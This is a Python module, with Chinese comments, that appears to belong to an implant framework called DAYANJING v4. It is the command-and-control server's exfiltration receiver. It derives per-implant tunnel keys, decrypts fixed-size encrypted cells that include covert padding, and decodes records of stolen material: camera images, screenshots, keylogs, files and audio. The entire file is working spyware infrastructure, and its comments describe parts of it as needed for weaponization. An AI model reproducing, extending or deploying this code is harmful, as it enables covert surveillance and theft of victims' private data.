"""
DAYANJING v4 — 采集产物接收端（13_c2_server/exfil_sink）
========================================================

把 21_exfil 的回传信元流接进 C2 会话管理，解出产物并落库。

本模块是 **C 侧 21_exfil 的 Python 对端**。它不设计新协议，只是把已定义的
线上格式在 Python 侧复刻一遍，因此每个常量都必须与 C 头文件逐字节一致：

  - 隧道密钥派生   —— 14_p2p/src/crypto.c: p2p_tunnel_init_from_session
  - 定长信元格式   —— 14_p2p/include/p2p_cell.h + src/cell.c
  - 产物记录格式   —— 21_exfil/include/exfil.h + src/exfil.c

任何一处常量漂移都会表现为 AUTH/CRC 失败而不是"数据略有不同"，这是刻意的：
宁可整批拒绝，不可静默产出错误内容。

====================================================================
派生链（与 C 侧 p2p_tunnel_init_from_session 完全一致）
====================================================================
    ikm  = k_c2s || k_s2c
    salt = "dayanjing:p2p:tunnel:v1"
    info = "p2p:tunnel:keys:v1" || min(local_id, peer_id) || max(...)
    okm  = HKDF-SHA256(salt, ikm, info, 40)
             okm[0:16]   = k_forward  (lo -> hi)
             okm[16:32]  = k_reverse  (hi -> lo)
             okm[32:40]  = nonce_pfx

    info 必须用规范序（min || max）拼接。若写成 local || peer，两端 info 不同
    -> OKM 不同 -> 密钥对不上。这是最容易犯也最难查的错。

    本端 k_send/k_recv 由 local_id 与 peer_id 的大小关系决定：
        local < peer  ->  k_send = k_forward, k_recv = k_reverse
        local > peer  ->  k_send = k_reverse, k_recv = k_forward
    两端因此得到互补的方向密钥，无需交换角色字节。

====================================================================
信元层（恒 512 字节）
====================================================================
    wire     = ct(496) || tag(16)
    pt       = cmd(1) || len(2 LE) || data[len] || pad(随机)
    IV       = pfx(8) || counter(4 LE)      —— 不在线上传输，两端各自计数
    AAD      = IV（把信元绑定到位置，防重排）
    cmd      1=DATA  2=PAD(覆盖)  3=FIN(本批结束)

    counter 严格递增：每成功解一个信元 +1。重放旧信元会因 IV 不匹配而被 AEAD
    拒绝，表现为 AUTH（不是"重放"错误码）—— 与 C 侧行为一致。

====================================================================
批边界（武器化必需）
====================================================================
只有收到 cmd=FIN 才算一批完整。流被截断（对端崩溃 / 链路被掐）时
incomplete() 返回 True，调用方必须按失败处理，**绝不把已累积的部分当成功**。
"""

import hashlib
import struct
import time
from typing import Optional, Dict, List, Tuple

from crypto_layer import GCM, hkdf

# ---------------------------------------------------------------------------
# 常量：与 C 侧逐字节一致，改动前必须同步对面
# ---------------------------------------------------------------------------

P2P_TUNNEL_SALT = b"dayanjing:p2p:tunnel:v1"
P2P_TUNNEL_LABEL = b"p2p:tunnel:keys:v1"
P2P_KEY_LEN = 16
P2P_C_ID_LEN = 16
P2P_NONCE_PFX_LEN = 8
P2P_TUNNEL_OKM_LEN = P2P_KEY_LEN * 2 + P2P_NONCE_PFX_LEN  # 40

CELL_WIRE = 512
CELL_TAG_LEN = 16
CELL_PT_LEN = 496          # = WIRE - TAG
CELL_HDR_LEN = 3           # cmd(1) || len(2)
CELL_DATA_MAX = 493        # = PT - HDR

CMD_DATA = 1
CMD_PAD = 2
CMD_FIN = 3

EXF_MAGIC4 = b"EXF1"
EXF_VER = 1
EXF_HDR_LEN = 104
EXF_NAME_LEN = 64
EXF_PAYLOAD_MAX = 16 << 20

EXF_OFF_SEQ = 8
EXF_OFF_TS = 16
EXF_OFF_WIDTH = 24
EXF_OFF_HEIGHT = 28
EXF_OFF_PLEN = 32
EXF_OFF_NAME = 36
EXF_OFF_CRC = 100

EXF_TYPE_CAMERA_JPEG = 1
EXF_TYPE_SCREENSHOT = 2
EXF_TYPE_KEYLOG = 3
EXF_TYPE_FILE = 4
EXF_TYPE_AUDIO = 5

EXF_FLAG_LAST = 0x01
EXF_FLAG_KEYFRAME = 0x02
EXF_FLAG_NAME_TRUNC = 0x04

# 错误码与 21_exfil/include/exfil.h 对齐
EXF_OK = 0
EXF_ERR_ARG = -1
EXF_ERR_LEN = -2
EXF_ERR_AUTH = -3
EXF_ERR_FMT = -4
EXF_ERR_CRC = -5
EXF_ERR_INCOMPLETE = -6
EXF_ERR_IO = -7

EXF_ERRSTR = {
    EXF_OK: "ok",
    EXF_ERR_ARG: "invalid argument",
    EXF_ERR_LEN: "length invalid / buffer too small",
    EXF_ERR_AUTH: "AEAD authentication failed",
    EXF_ERR_FMT: "format error",
    EXF_ERR_CRC: "CRC32 mismatch",
    EXF_ERR_INCOMPLETE: "batch truncated before FIN",
    EXF_ERR_IO: "link IO failure",
}


class ExfilError(Exception):
    """回传层错误。code 与 C 侧错误码同域。"""

    def __init__(self, code: int, detail: str = ""):
        self.code = code
        self.detail = detail
        name = EXF_ERRSTR.get(code, "unknown")
        super().__init__(f"{name} ({code})" + (f": {detail}" if detail else ""))


# ---------------------------------------------------------------------------
# CRC32 (IEEE 802.3, poly 0xEDB88320)
# ---------------------------------------------------------------------------
# 与 C 侧 exfil.c 的 g_crc_tab 同一张表。C 侧分两段计算（头再载荷），
# Python 侧必须复刻同样的分段，否则大载荷的 CRC 会对不上。

def _build_crc_tab() -> List[int]:
    tab = []
    for i in range(256):
        c = i
        for _ in range(8):
            c = (0xEDB88320 ^ (c >> 1)) if (c & 1) else (c >> 1)
        tab.append(c & 0xFFFFFFFF)
    return tab


_CRC_TAB = _build_crc_tab()


def crc32_raw_py(crc: int, data: bytes) -> int:
    """纯 Python 参考实现（慢，用于交叉验证快路径）。"""
    t = _CRC_TAB
    for b in data:
        crc = t[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFF


def _exf_crc32(hdr_part: bytes, payload: bytes) -> int:
    """头前 100 字节 + 载荷，连续计算后取反。与 C 侧分段完全一致。"""
    try:
        import zlib
        # zlib.crc32(data, value) 的语义：内部 raw(value ^ 0xFFFFFFFF, data) ^ 0xFFFFFFFF
        # 因此分段串联  zlib.crc32(payload, zlib.crc32(hdr))  恰好等于
        #   raw(raw(0xFFFFFFFF, hdr), payload) ^ 0xFFFFFFFF     —— 与 C 侧一致。
        return zlib.crc32(payload, zlib.crc32(hdr_part)) & 0xFFFFFFFF
    except ImportError:
        c = crc32_raw_py(0xFFFFFFFF, hdr_part)
        if payload:
            c = crc32_raw_py(c, payload)
        return (c ^ 0xFFFFFFFF) & 0xFFFFFFFF


def exf_crc32_py(hdr_part: bytes, payload: bytes) -> int:
    """纯 Python 路径，供测试交叉验证 _exf_crc32。"""
    c = crc32_raw_py(0xFFFFFFFF, hdr_part)
    if payload:
        c = crc32_raw_py(c, payload)
    return (c ^ 0xFFFFFFFF) & 0xFFFFFFFF


# ---------------------------------------------------------------------------
# 隧道密钥派生
# ---------------------------------------------------------------------------

def derive_node_id(implant_id: str) -> bytes:
    """implant_id(字符串) -> 16 字节节点 ID。

    C 侧节点 ID 是定长 16 字节裸字节，而 implant_id 是变长字符串，需要一个
    确定的映射。取 SHA-256 前 16 字节：确定、无碰撞风险、不泄露原串。
    """
    return hashlib.sha256(implant_id.encode("utf-8")).digest()[:P2P_C_ID_LEN]


def derive_tunnel_keys(k_c2s: bytes, k_s2c: bytes,
                       local_id: bytes, peer_id: bytes
                       ) -> Tuple[bytes, bytes, bytes]:
    """与 C 侧 p2p_tunnel_init_from_session 等价的派生。

    返回 (k_send, k_recv, nonce_pfx)。
    """
    if len(k_c2s) != P2P_KEY_LEN or len(k_s2c) != P2P_KEY_LEN:
        raise ExfilError(EXF_ERR_ARG, "session key must be 16 bytes")
    if len(local_id) != P2P_C_ID_LEN or len(peer_id) != P2P_C_ID_LEN:
        raise ExfilError(EXF_ERR_ARG, "node id must be 16 bytes")
    if local_id == peer_id:
        raise ExfilError(EXF_ERR_ARG, "local_id must differ from peer_id")
    if k_c2s == k_s2c:
        # 单向分离失效时派生出的隧道密钥同样退化，C 侧拒绝，此处也必须拒绝
        raise ExfilError(EXF_ERR_ARG, "degenerate session keys (k_c2s == k_s2c)")

    ikm = k_c2s + k_s2c
    lo, hi = (local_id, peer_id) if local_id < peer_id else (peer_id, local_id)
    info = P2P_TUNNEL_LABEL + lo + hi

    okm = hkdf(P2P_TUNNEL_SALT, ikm, info, P2P_TUNNEL_OKM_LEN)
    k_forward = okm[0:16]
    k_reverse = okm[16:32]
    pfx = okm[32:40]

    if local_id < peer_id:
        k_send, k_recv = k_forward, k_reverse
    else:
        k_send, k_recv = k_reverse, k_forward
    return k_send, k_recv, pfx


# ---------------------------------------------------------------------------
# 信元流解封
# ---------------------------------------------------------------------------

class CellStream:
    """定长信元解封。只解一个方向（k_recv），counter 严格递增。"""

    def __init__(self, k_send: bytes, k_recv: bytes, pfx: bytes,
                 recv_counter: int = 0):
        if len(pfx) != P2P_NONCE_PFX_LEN:
            raise ExfilError(EXF_ERR_ARG, "pfx must be 8 bytes")
        if recv_counter < 0 or recv_counter > 0xFFFFFFFF:
            raise ExfilError(EXF_ERR_ARG, "recv_counter out of range")
        self._k_send = k_send
        self._k_recv = k_recv
        self._pfx = pfx
        # 会话恢复时必须从断点续接：归零会让两端 IV 重新重合，
        # 同一密钥下 IV 重用 -> 两条密文异或即泄露明文异或。
        self._recv_counter = recv_counter
        self._gcm = GCM(k_recv)

    @property
    def counter(self) -> int:
        return self._recv_counter

    def _iv(self, counter: int) -> bytes:
        return self._pfx + struct.pack("<I", counter & 0xFFFFFFFF)

    def unpack(self, wire: bytes) -> Tuple[int, bytes]:
        """解一个信元，返回 (cmd, data)。AEAD 失败抛 ExfilError(AUTH)。"""
        if len(wire) != CELL_WIRE:
            raise ExfilError(EXF_ERR_LEN, f"cell must be {CELL_WIRE} bytes")

        iv = self._iv(self._recv_counter)
        ct = wire[:CELL_PT_LEN]
        tag = wire[CELL_PT_LEN:CELL_PT_LEN + CELL_TAG_LEN]

        try:
            pt = self._gcm.decrypt(iv, ct, iv, tag)
        except Exception:
            # 密钥错、counter 错位、被篡改 —— 全部归为 AUTH，不区分（不泄露原因）
            raise ExfilError(EXF_ERR_AUTH, "cell AEAD failed")
        if pt is None or len(pt) != CELL_PT_LEN:
            raise ExfilError(EXF_ERR_AUTH, "cell AEAD failed")

        dlen = pt[1] | (pt[2] << 8)
        if dlen > CELL_DATA_MAX:
            raise ExfilError(EXF_ERR_FMT, f"cell data len {dlen} exceeds max")

        # counter 前进必须在成功之后：失败不推进，重传/重试才可能成功
        self._recv_counter += 1

        cmd = pt[0]
        return cmd, bytes(pt[CELL_HDR_LEN:CELL_HDR_LEN + dlen])


# ---------------------------------------------------------------------------
# 产物记录解码
# ---------------------------------------------------------------------------

def decode_record(buf: bytes) -> Dict:
    """解码一条完整产物记录（头 104 + 载荷）。返回 dict，不做拷贝以外的分配。"""
    if len(buf) < EXF_HDR_LEN:
        raise ExfilError(EXF_ERR_LEN, "record shorter than header")
    if buf[0:4] != EXF_MAGIC4:
        raise ExfilError(EXF_ERR_FMT, "bad magic")
    if buf[4] != EXF_VER:
        raise ExfilError(EXF_ERR_FMT, f"unsupported version {buf[4]}")
    if buf[7] != 0:
        raise ExfilError(EXF_ERR_FMT, "rsv must be zero")

    (plen,) = struct.unpack_from("<I", buf, EXF_OFF_PLEN)
    if plen > EXF_PAYLOAD_MAX:
        raise ExfilError(EXF_ERR_LEN, "payload too large")
    if plen + EXF_HDR_LEN != len(buf):
        raise ExfilError(EXF_ERR_FMT,
                         f"payload length mismatch: hdr says {plen}, buffer has {len(buf) - EXF_HDR_LEN}")

    (want,) = struct.unpack_from("<I", buf, EXF_OFF_CRC)
    got = _exf_crc32(buf[:EXF_OFF_CRC], buf[EXF_HDR_LEN:])
    if got != want:
        raise ExfilError(EXF_ERR_CRC, f"crc {got:#010x} != {want:#010x}")

    (seq,) = struct.unpack_from("<Q", buf, EXF_OFF_SEQ)
    (ts_us,) = struct.unpack_from("<Q", buf, EXF_OFF_TS)
    (width,) = struct.unpack_from("<I", buf, EXF_OFF_WIDTH)
    (height,) = struct.unpack_from("<I", buf, EXF_OFF_HEIGHT)

    raw_name = buf[EXF_OFF_NAME:EXF_OFF_NAME + EXF_NAME_LEN]
    name = raw_name.split(b"\x00", 1)[0].decode("utf-8", "replace")

    return {
        "type": buf[5],
        "flags": buf[6],
        "seq": seq,
        "ts_us": ts_us,
        "width": width,
        "height": height,
        "name": name,
        "name_truncated": bool(buf[6] & EXF_FLAG_NAME_TRUNC),
        "payload": bytes(buf[EXF_HDR_LEN:]),
    }


# ---------------------------------------------------------------------------
# 接收端
# ---------------------------------------------------------------------------

class ExfilSink:
    """一端回传通道的接收侧。

    用法：
        sink = ExfilSink.for_implant(k_c2s, k_s2c, server_static_id, implant_id)
        rec = sink.feed(wire512)      # None=累积中/PAD；dict=一批完整
        if sink.incomplete: ...       # 流被截断时按失败处理
    """

    def __init__(self, k_send: bytes, k_recv: bytes, pfx: bytes,
                 max_rec: int = 1 << 20, recv_counter: int = 0):
        if max_rec <= 0:
            max_rec = 1 << 20
        if max_rec > EXF_PAYLOAD_MAX:
            max_rec = EXF_PAYLOAD_MAX
        self._cell = CellStream(k_send, k_recv, pfx,
                                recv_counter=recv_counter)
        self._max_rec = max_rec
        self._buf = bytearray()
        self._in_batch = False

    @classmethod
    def for_implant(cls, k_c2s: bytes, k_s2c: bytes,
                    server_node_id: bytes, implant_id: str,
                    max_rec: int = 1 << 20,
                    recv_counter: int = 0) -> "ExfilSink":
        """按 implant 建立接收端。k_c2s/k_s2c 来自 02_c2 会话派生。

        recv_counter 用于会话恢复：重连后必须从断点续接，不能归零。
        """
        peer = derive_node_id(implant_id)
        k_send, k_recv, pfx = derive_tunnel_keys(k_c2s, k_s2c, server_node_id, peer)
        return cls(k_send, k_recv, pfx, max_rec=max_rec,
                   recv_counter=recv_counter)

    # -- 状态 ---------------------------------------------------------------

    @property
    def incomplete(self) -> bool:
        """批已开始但未收到 FIN —— 流被截断。调用方必须按失败处理。"""
        return self._in_batch

    @property
    def counter(self) -> int:
        return self._cell.counter

    def reset(self):
        """丢弃未完成的批，回到空闲态。"""
        self._buf = bytearray()
        self._in_batch = False

    # -- 喂入 ---------------------------------------------------------------

    def feed(self, wire: bytes) -> Optional[Dict]:
        """喂入一个 512 字节信元。

        返回 None  —— 累积中，或喂入的是覆盖信元（PAD）
        返回 dict  —— 一批完整，已产出一条记录
        抛出 ExfilError —— AUTH / CRC / FMT / LEN
        """
        cmd, data = self._cell.unpack(wire)

        if cmd == CMD_PAD:
            return None                      # 覆盖信元不携带数据
        if cmd not in (CMD_DATA, CMD_FIN):
            raise ExfilError(EXF_ERR_FMT, f"unknown cell cmd {cmd}")

        if len(self._buf) + len(data) > self._max_rec + EXF_HDR_LEN:
            self.reset()
            raise ExfilError(EXF_ERR_LEN, "record exceeds max_rec")

        self._buf.extend(data)
        self._in_batch = True

        if cmd != CMD_FIN:
            return None

        # 收到 FIN：一批结束，解码并复位
        buf = bytes(self._buf)
        self._in_batch = False
        self._buf = bytearray()
        return decode_record(buf)
